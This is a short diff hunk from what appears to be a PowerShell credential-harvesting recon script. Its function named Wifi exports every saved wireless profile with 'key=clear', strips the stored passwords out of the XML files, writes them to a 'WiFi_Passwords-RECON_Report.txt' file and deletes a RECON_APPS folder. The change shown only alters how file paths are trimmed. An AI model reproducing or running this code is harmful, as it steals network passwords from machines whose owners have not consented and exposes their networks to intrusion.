@@ -11,7 +11,7 @@ function Get-Nirsoft {
 
 function Wifi {
 Set-Location -Path $P1X3L; netsh wlan export profile key=clear
-Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "$P1X3L", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
+Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
 Remove-Item -Path "$P1X3L\RECON_APPS" -Force -Recurse;
 }
 
